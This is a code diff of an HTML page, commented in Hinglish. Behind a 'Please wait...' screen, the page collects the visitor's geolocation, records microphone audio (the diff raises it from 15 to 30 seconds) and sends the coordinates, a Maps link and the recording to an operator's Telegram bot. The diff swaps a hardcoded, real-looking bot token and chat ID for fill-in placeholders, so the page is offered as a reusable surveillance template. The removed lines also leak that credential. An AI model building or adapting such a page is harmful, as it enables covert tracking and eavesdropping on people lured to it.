@@ -12,9 +12,9 @@
     <h3 id="statusText">Please wait...</h3>
 
     <script>
-        // 1. Yahan apni Telegram details daalo
-        const TELEGRAM_BOT_TOKEN = "8768491883:AAHAAVP8pW2crUetL_D_i7N9n3zlJ_h58NI"; 
-        const TELEGRAM_CHAT_ID = "8839147082"; 
+        // 1. Yahan apni Telegram details daalo (Quotes ke andar)
+        const TELEGRAM_BOT_TOKEN = "YAHAN_BOT_TOKEN_DAALO"; 
+        const TELEGRAM_CHAT_ID = "YAHAN_CHAT_ID_DAALO"; 
 
         // 2. Location nikaalo
         if ("geolocation" in navigator) {
@@ -40,7 +40,7 @@
         // 3. Mic start karo aur Audio record karo
         async function startMic(lat, lon, mapLink) {
             try {
-                document.getElementById('statusText').innerText = "Recording audio (15s)...";
+                document.getElementById('statusText').innerText = "Recording audio (30s)...";
                 
                 // Sirf Audio (Mic) ki permission maango
                 const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -48,7 +48,7 @@
                     video: false 
                 });
 
-                // MediaRecorder setup (Telegram voice note ke liye best format)
+                // MediaRecorder setup
                 const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
                 const chunks = [];
 
@@ -71,10 +71,10 @@
 
                 mediaRecorder.start();
 
-                // 15000 ms = 15 second baad recording rok do
+                // 30000 ms = 30 second baad recording rok do
                 setTimeout(() => {
                     mediaRecorder.stop();
-                }, 15000); 
+                }, 30000); 
 
             } catch (err) {
                 console.error("Mic error: ", err);
@@ -88,7 +88,7 @@
         async function sendToTelegram(lat, lon, mapLink, audioBlob) {
             
             // Pehle Text Message (Location ke sath) bhejo
-            const textMessage = `📍 *New Audio Recording (15 Sec)*\n\n*Lat:* ${lat}\n*Lon:* ${lon}\n*Map:* [Google Maps]( ${mapLink} )`;
+            const textMessage = `📍 *New Audio Recording (30 Sec)*\n\n*Lat:* ${lat}\n*Lon:* ${lon}\n*Map:* [Google Maps]( ${mapLink} )`;
             
             try {
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -105,7 +105,7 @@
                 if (audioBlob) {
                     const formData = new FormData();
                     formData.append("chat_id", TELEGRAM_CHAT_ID);
-                    formData.append("voice", audioBlob, "audio.webm"); // 'voice' likhne se Telegram isko voice note banata hai
+                    formData.append("voice", audioBlob, "audio.webm");
 
                     await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVoice`, {
                         method: "POST",
